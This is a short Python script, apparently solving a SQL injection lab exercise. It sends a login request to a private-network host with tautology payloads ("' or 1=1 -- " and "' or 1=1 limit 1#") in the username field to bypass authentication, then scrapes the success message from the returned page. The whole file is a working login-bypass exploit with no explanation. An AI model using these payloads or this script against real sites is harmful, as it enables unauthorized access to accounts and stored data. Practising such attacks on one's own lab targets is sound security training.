from urllib import request, parse
import lxml.etree as etree
import lxml.html

data = {"username": "' or 1=1 -- ", "password": "password","submit": "Submit Query"}
data = {"username": "\' or 1=1 limit 1#", "password": "password","submit": "Submit Query"}
data = parse.urlencode(data)
url = "http://10.0.1.15/sqlinjection/example2/?"+data
# print(url)
with request.urlopen(url) as resq:
	content = resq.read()

# https://stackoverflow.com/questions/43098529/how-to-print-all-text-in-a-specific-tag-using-xpath-in-python
# https://stackoverflow.com/questions/53195927/get-all-text-in-an-lxml-node
tree = lxml.html.fromstring(content)
divs = tree.xpath("//div[@class='text-success']//text()")
for el in divs:
    print (el)
